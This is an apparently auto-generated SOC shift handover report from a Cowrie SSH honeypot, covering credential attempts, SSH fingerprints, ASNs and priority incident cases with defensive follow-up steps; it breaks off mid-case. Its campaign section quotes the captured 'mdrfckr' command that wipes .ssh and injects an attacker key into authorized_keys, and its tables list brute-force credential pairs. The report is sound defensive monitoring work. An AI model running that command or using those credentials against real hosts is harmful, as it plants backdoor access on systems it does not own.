# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-21 |
| **Generated At** | 2026-08-21T10:36:28Z |
| **Shift Time** | 10:36 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **137** |
| Confirmed Threats | **110** |
| False Positives Filtered | **27** (19.7%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **29** |
| High Severity Cases | **67** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **70** |
| Malware Samples Analyzed | **3** HIGH · **17** MED · 24 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **89** |
| Unique Credential Pairs | **46** |
| Unique Usernames | **13** |
| Unique Passwords | **45** |
| Successful Auth Pairs | **78** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 19 |
| `unknown` | 14 |
| `ubuntu` | 12 |
| `support` | 12 |
| `admin` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `unknown2013` | 6 |
| `support2002` | 6 |
| `abcd1234` | 6 |
| `abc123` | 5 |
| `admin2021` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `unknown` | `unknown2013` | 6 |
| `support` | `support2002` | 6 |
| `pi` | `abcd1234` | 6 |
| `unknown` | `abc123` | 5 |
| `admin` | `admin2021` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `Web@12345` | `217.60.255.130` | 2026-08-21T06:56:42 |
| `root` | `P@ssw0rd123@` | `217.60.255.130` | 2026-08-21T06:56:47 |
| `unknown` | `unknown2013` | `10.0.0.73` | 2026-08-21T06:58:11 |
| `unknown` | `unknown2013` | `49.124.153.37` | 2026-08-21T06:59:34 |
| `unknown` | `unknown2013` | `182.79.218.164` | 2026-08-21T06:59:47 |
| `guest` | `guest2001` | `10.0.0.73` | 2026-08-21T07:00:53 |
| `ubuntu` | `oracle` | `217.60.255.130` | 2026-08-21T07:07:02 |
| `root` | `P@ssw0rd2023` | `217.60.255.130` | 2026-08-21T07:07:06 |
| `support` | `support2002` | `10.0.0.73` | 2026-08-21T07:07:09 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-21T07:08:18 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-21T07:08:18 |
| `support` | `support` | `176.53.159.196` | 2026-08-21T07:14:49 |
| `unknown` | `unknown2013` | `65.20.205.197` | 2026-08-21T07:15:21 |
| `unknown` | `unknown2013` | `112.194.142.167` | 2026-08-21T07:15:35 |
| `ubuntu` | `Qwert@2025` | `217.60.255.130` | 2026-08-21T07:17:23 |
| `root` | `Administrator@321` | `217.60.255.130` | 2026-08-21T07:17:27 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-08-21T07:17:44 |
| `supervisor` | `supervisor2013` | `121.8.209.94` | 2026-08-21T07:22:39 |
| `supervisor` | `supervisor2013` | `122.163.121.233` | 2026-08-21T07:22:47 |
| `support` | `support2002` | `58.104.77.75` | 2026-08-21T07:25:14 |
| `support` | `support2002` | `178.214.160.4` | 2026-08-21T07:25:28 |
| `support` | `support2002` | `183.239.20.236` | 2026-08-21T07:25:32 |
| `support` | `support2002` | `118.122.196.230` | 2026-08-21T07:25:43 |
| `ubuntu` | `Asdfgh@12345` | `217.60.255.130` | 2026-08-21T07:27:57 |
| `root` | `P@ssw0rd@12345` | `217.60.255.130` | 2026-08-21T07:28:02 |
| `default` | `pass` | `10.0.0.73` | 2026-08-21T07:31:05 |
| `default` | `pass` | `14.97.77.182` | 2026-08-21T07:32:33 |
| `default` | `pass` | `36.64.211.93` | 2026-08-21T07:32:45 |
| `ubuntu` | `@WSXcde3` | `217.60.255.130` | 2026-08-21T07:38:22 |
| `root` | `P@ssw0rd` | `217.60.255.130` | 2026-08-21T07:38:24 |
| `support` | `support` | `10.0.0.73` | 2026-08-21T07:38:30 |
| `support` | `support2016` | `10.0.0.73` | 2026-08-21T07:40:27 |
| `default` | `pass` | `82.65.183.240` | 2026-08-21T07:48:35 |
| `ubuntu` | `elastic1234` | `217.60.255.130` | 2026-08-21T07:48:54 |
| `root` | `@dmin1234` | `217.60.255.130` | 2026-08-21T07:48:59 |
| `supervisor` | `supervisor2013` | `37.255.197.138` | 2026-08-21T07:50:29 |
| `user` | `user2021` | `138.122.242.42` | 2026-08-21T07:55:19 |
| `user` | `user2021` | `60.173.105.206` | 2026-08-21T07:55:30 |
| `support` | `support2016` | `121.167.110.137` | 2026-08-21T07:58:28 |
| `support` | `support2016` | `116.114.94.242` | 2026-08-21T07:58:37 |
| `root` | `﻿------fuck------` | `109.237.96.127` | 2026-08-21T07:59:31 |
| `ubuntu` | `ubnt` | `217.60.255.130` | 2026-08-21T07:59:43 |
| `root` | `123qwe!@#QWE` | `217.60.255.130` | 2026-08-21T07:59:46 |
| `unknown` | `abc123` | `10.0.0.73` | 2026-08-21T08:04:17 |
| `unknown` | `abc123` | `178.178.194.136` | 2026-08-21T08:05:53 |
| `user` | `user2021` | `10.0.0.73` | 2026-08-21T08:06:36 |
| `ubuntu` | `nvidia` | `217.60.255.130` | 2026-08-21T08:10:25 |
| `root` | `123@qwe` | `217.60.255.130` | 2026-08-21T08:10:29 |
| `admin` | `admin2021` | `10.0.0.73` | 2026-08-21T08:13:32 |
| `ubuntu` | `tools@123` | `217.60.255.130` | 2026-08-21T08:21:09 |
| `root` | `niagara` | `217.60.255.130` | 2026-08-21T08:21:13 |
| `unknown` | `abc123` | `187.93.68.178` | 2026-08-21T08:21:23 |
| `unknown` | `abc123` | `180.71.9.31` | 2026-08-21T08:21:31 |
| `user` | `user2021` | `177.135.209.177` | 2026-08-21T08:23:21 |
| `unknown` | `Passw0rd` | `111.70.23.250` | 2026-08-21T08:28:23 |
| `admin` | `admin2021` | `42.3.98.247` | 2026-08-21T08:31:19 |
| `admin` | `admin2021` | `202.154.15.177` | 2026-08-21T08:31:29 |
| `admin` | `admin2021` | `78.187.230.168` | 2026-08-21T08:31:31 |
| `postgres` | `pgsql` | `20.12.41.6` | 2026-08-21T08:31:37 |
| `345gs5662d34` | `345gs5662d34` | `20.12.41.6` | 2026-08-21T08:31:39 |
| `postgres` | `3245gs5662d34` | `20.12.41.6` | 2026-08-21T08:31:39 |
| `admin` | `admin2021` | `112.118.194.159` | 2026-08-21T08:31:40 |
| `ubuntu` | `admin00` | `217.60.255.130` | 2026-08-21T08:32:03 |
| `root` | `Abc@1234` | `217.60.255.130` | 2026-08-21T08:32:08 |
| `root` | `root2004` | `10.0.0.73` | 2026-08-21T08:37:17 |
| `root` | `root2004` | `65.20.143.45` | 2026-08-21T08:38:50 |
| `unknown` | `Passw0rd` | `10.0.0.73` | 2026-08-21T08:39:31 |
| `ubuntu` | `Priya@123` | `217.60.255.130` | 2026-08-21T08:43:14 |
| `root` | `Qa123456` | `217.60.255.130` | 2026-08-21T08:43:17 |
| `admin` | `admin` | `8.208.44.152` | 2026-08-21T08:44:08 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-21T08:44:09 |
| `mcuser` | `mcuser123` | `118.139.164.171` | 2026-08-21T08:46:08 |
| `345gs5662d34` | `345gs5662d34` | `118.139.164.171` | 2026-08-21T08:46:12 |
| `mcuser` | `3245gs5662d34` | `118.139.164.171` | 2026-08-21T08:46:13 |
| `ubuntu` | `Radha@123` | `217.60.255.130` | 2026-08-21T08:54:14 |
| `root` | `sq` | `217.60.255.130` | 2026-08-21T08:54:19 |
| `root` | `root2004` | `175.205.103.66` | 2026-08-21T08:54:30 |
| `root` | `root2004` | `197.242.170.10` | 2026-08-21T08:54:40 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **137** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 37 |
| OpenSSH | 31 |
| Go SSH scanner | 5 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 31 | 31 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `a2de0f306611...` | Mirai/variant | 2 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 31 | 31 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.12.41.6`, `118.139.164.171`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **54** |
| High-Risk ASNs | **44** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS272066` | FIBRAZUL INTERNET S.R.L. | 4 | LOW |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS12322` | Free SAS | 2 | HIGH |
| `AS4760` | HKT Limited | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (66)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3f1c23242c77

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:56 |
| **Last Seen** | 2026-08-21 06:56 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:56:39` | `cowrie.session.connect` |
| `2026-08-21 06:56:40` | `cowrie.client.version` |
| `2026-08-21 06:56:40` | `cowrie.client.kex` |
| `2026-08-21 06:56:42` | `cowrie.login.success` |
| `2026-08-21 06:56:43` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:56:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 06:56:56` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0815f7d20821

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:56 |
| **Last Seen** | 2026-08-21 06:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:56:43` | `cowrie.session.connect` |
| `2026-08-21 06:56:43` | `cowrie.client.version` |
| `2026-08-21 06:56:43` | `cowrie.client.kex` |
| `2026-08-21 06:56:47` | `cowrie.login.success` |
| `2026-08-21 06:56:47` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:56:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 06:56:47` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffeecb0930c2

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]37` |
| **First Seen** | 2026-08-21 06:59 |
| **Last Seen** | 2026-08-21 06:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:59:31` | `cowrie.session.connect` |
| `2026-08-21 06:59:32` | `cowrie.client.version` |
| `2026-08-21 06:59:32` | `cowrie.client.kex` |
| `2026-08-21 06:59:34` | `cowrie.login.success` |
| `2026-08-21 06:59:34` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]37` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a27b7970a6ae

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]164` |
| **First Seen** | 2026-08-21 06:59 |
| **Last Seen** | 2026-08-21 06:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:59:44` | `cowrie.session.connect` |
| `2026-08-21 06:59:45` | `cowrie.client.version` |
| `2026-08-21 06:59:45` | `cowrie.client.kex` |
| `2026-08-21 06:59:47` | `cowrie.login.success` |
| `2026-08-21 06:59:47` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]164` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b05a53ed3189

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:06 |
| **Last Seen** | 2026-08-21 07:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:06:59` | `cowrie.session.connect` |
| `2026-08-21 07:06:59` | `cowrie.client.version` |
| `2026-08-21 07:06:59` | `cowrie.client.kex` |
| `2026-08-21 07:07:02` | `cowrie.login.success` |
| `2026-08-21 07:07:02` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:07:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:07:02` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:07:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbbfa675436b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:07 |
| **Last Seen** | 2026-08-21 07:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:07:03` | `cowrie.session.connect` |
| `2026-08-21 07:07:03` | `cowrie.client.version` |
| `2026-08-21 07:07:04` | `cowrie.client.kex` |
| `2026-08-21 07:07:06` | `cowrie.login.success` |
| `2026-08-21 07:07:06` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:07:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:07:07` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-121c042d6f37

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-21 07:08 |
| **Last Seen** | 2026-08-21 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:08:17` | `cowrie.session.connect` |
| `2026-08-21 07:08:17` | `cowrie.client.version` |
| `2026-08-21 07:08:17` | `cowrie.client.kex` |
| `2026-08-21 07:08:18` | `cowrie.login.success` |
| `2026-08-21 07:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69c538b87af8

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-21 07:08 |
| **Last Seen** | 2026-08-21 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:08:17` | `cowrie.session.connect` |
| `2026-08-21 07:08:17` | `cowrie.client.version` |
| `2026-08-21 07:08:17` | `cowrie.client.kex` |
| `2026-08-21 07:08:18` | `cowrie.login.success` |
| `2026-08-21 07:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a152915d8b3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-21 07:14 |
| **Last Seen** | 2026-08-21 07:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:14:48` | `cowrie.session.connect` |
| `2026-08-21 07:14:48` | `cowrie.client.version` |
| `2026-08-21 07:14:48` | `cowrie.client.kex` |
| `2026-08-21 07:14:49` | `cowrie.login.success` |
| `2026-08-21 07:14:49` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:14:49` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87b5eeb61cc2

| Field | Detail |
|---|---|
| **Source IP** | `65.20.205[.]197` |
| **First Seen** | 2026-08-21 07:15 |
| **Last Seen** | 2026-08-21 07:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:15:20` | `cowrie.session.connect` |
| `2026-08-21 07:15:20` | `cowrie.client.version` |
| `2026-08-21 07:15:20` | `cowrie.client.kex` |
| `2026-08-21 07:15:21` | `cowrie.login.success` |
| `2026-08-21 07:15:22` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:15:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.205[.]197` to AbuseIPDB if not already reported
- [ ] Block `65.20.205[.]197` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db35f55c61a9

| Field | Detail |
|---|---|
| **Source IP** | `112.194.142[.]167` |
| **First Seen** | 2026-08-21 07:15 |
| **Last Seen** | 2026-08-21 07:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:15:32` | `cowrie.session.connect` |
| `2026-08-21 07:15:32` | `cowrie.client.version` |
| `2026-08-21 07:15:32` | `cowrie.client.kex` |
| `2026-08-21 07:15:35` | `cowrie.login.success` |
| `2026-08-21 07:15:36` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.194.142[.]167` to AbuseIPDB if not already reported
- [ ] Block `112.194.142[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bdb26d2bdc8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:17 |
| **Last Seen** | 2026-08-21 07:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:17:20` | `cowrie.session.connect` |
| `2026-08-21 07:17:22` | `cowrie.client.version` |
| `2026-08-21 07:17:22` | `cowrie.client.kex` |
| `2026-08-21 07:17:23` | `cowrie.login.success` |
| `2026-08-21 07:17:23` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:17:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:17:25` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9fc51135a6d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:17 |
| **Last Seen** | 2026-08-21 07:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:17:25` | `cowrie.session.connect` |
| `2026-08-21 07:17:25` | `cowrie.client.version` |
| `2026-08-21 07:17:25` | `cowrie.client.kex` |
| `2026-08-21 07:17:27` | `cowrie.login.success` |
| `2026-08-21 07:17:27` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:17:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:17:28` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f60239241a24

| Field | Detail |
|---|---|
| **Source IP** | `121.8.209[.]94` |
| **First Seen** | 2026-08-21 07:22 |
| **Last Seen** | 2026-08-21 07:22 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:22:34` | `cowrie.session.connect` |
| `2026-08-21 07:22:35` | `cowrie.client.version` |
| `2026-08-21 07:22:35` | `cowrie.client.kex` |
| `2026-08-21 07:22:39` | `cowrie.login.success` |
| `2026-08-21 07:22:40` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.8.209[.]94` to AbuseIPDB if not already reported
- [ ] Block `121.8.209[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a2e0e4e5f88

| Field | Detail |
|---|---|
| **Source IP** | `122.163.121[.]233` |
| **First Seen** | 2026-08-21 07:22 |
| **Last Seen** | 2026-08-21 07:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:22:45` | `cowrie.session.connect` |
| `2026-08-21 07:22:46` | `cowrie.client.version` |
| `2026-08-21 07:22:46` | `cowrie.client.kex` |
| `2026-08-21 07:22:47` | `cowrie.login.success` |
| `2026-08-21 07:22:48` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:22:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.163.121[.]233` to AbuseIPDB if not already reported
- [ ] Block `122.163.121[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c5fc5b06224

| Field | Detail |
|---|---|
| **Source IP** | `58.104.77[.]75` |
| **First Seen** | 2026-08-21 07:25 |
